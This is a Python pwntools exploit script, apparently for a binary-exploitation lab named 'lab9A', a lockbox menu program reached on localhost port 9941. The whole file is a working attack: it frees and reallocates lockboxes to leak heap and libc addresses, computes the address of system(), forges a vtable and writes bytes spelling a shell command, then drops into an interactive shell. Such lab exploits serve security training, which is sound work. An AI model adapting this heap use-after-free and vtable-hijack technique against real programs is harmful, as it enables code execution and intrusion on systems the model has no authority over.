from pwn import *
import re

# context.log_level = 'debug'

# p = process('./lab9A_patch2')
p = remote("127.0.0.1", 9941)

raw_input('Press Enter...')

def open_lockbox(which, numberOfItems):
	p.sendline('1')
	p.recv(256)
	p.sendline(str(which))
	p.recv(256)
	p.sendline(str(numberOfItems))
	p.recv(256)

def add_item(which, itemValue):
	p.sendline('2')
	p.recv(256)

	p.sendline(str(which))
	p.recv(256)

	p.sendline(str(itemValue))
	p.recv(256)

def destroy_lockbox(which):
	p.sendline('4')
	p.recv(256)

	p.sendline(str(which))
	p.recv(256)

def get_item(which, itemValue):
	p.sendline('3')
	p.recv(256)
	p.sendline(str(which))
	p.recv(256)
	p.sendline(str(itemValue))
	result = p.recvuntil('Enter choice:', drop=True)
	try:
		return re.search(r' = (.*?)\x0a', result).group(1)
	except Exception as e:
		return str(e) + 'No found leak in output!'

open_lockbox(0,20)
open_lockbox(1,20)

destroy_lockbox(1)
destroy_lockbox(0)

open_lockbox(0,4)

add_item(0,0x13370)

print('Memory leak [heap]:')
leak = get_item(0,3)
print('Leak: ' + format(hex(int(leak) & (2**32-1))))

# add_item(0,0x13370)

open_lockbox(2,4)
leak_libc = get_item(2,0)
print('Memory leak [libc]:')

print('Leak libc: ' + format(hex(int(leak_libc) & (2**32-1))))

libc_address_system = hex((int(leak_libc) & (2**32-1))-0x16a2c0)
print('Libc_adress_system: ' + libc_address_system)

add_item(2,int(libc_address_system,16))

print('leak: ' + str(leak))

forge_vtable = int(leak)-0x58-0xc
print('forge_vtable: ' + hex(forge_vtable))

add_item(0,forge_vtable)

add_item(0, 0x41414141)
add_item(0, 0x7c7c2042)
add_item(0, 0x00006873)

p.sendline('3')
p.sendline('1')
p.sendline('0')

p.interactive()
